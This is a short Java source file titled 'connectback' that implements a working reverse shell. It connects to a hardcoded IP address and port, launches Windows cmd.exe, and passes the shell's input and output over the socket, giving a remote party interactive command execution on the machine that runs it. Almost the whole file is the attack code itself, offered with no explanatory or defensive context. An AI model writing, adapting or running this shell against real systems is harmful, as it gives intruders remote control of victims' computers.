//Author  #Captain_Nemo
import java.net.*;
import java.io.*;
import java.io.OutputStream;
import java.io.InputStream;

  public class connectback {

      public static void main (String args[]) throws Exception {
      int c;
      Socket s = new Socket("192.168.225.196" ,8080);
      //Runtime r = Runtime.getRuntime(); 
     // Process p =  r.exec(new String[] {"C:\\Windows\\System32\\cmd.exe", "/K", "Start"});
     Process p = new ProcessBuilder("C:\\Windows\\System32\\cmd.exe").redirectErrorStream(true).start();
      InputStream pin = p.getInputStream(),sin=s.getInputStream();
      OutputStream pout = p.getOutputStream(),sout =s.getOutputStream();
      while(!s.isClosed())
        {
          while( pin.available() > 0 )
                 {
                  //int buff = in.read();
                   sout.write(pin.read());
                 }
          while( sin.available() > 0)
                 {
                   //int buff1 = in1.read();
                   pout.write(sin.read());
                 }
          pout.flush();
          sout.flush();
           try{
                p.exitValue();
                break;
              } catch (Exception e){}
        } // end while 

      p.destroy();
      s.close();
     }  //end main
 } //end class def
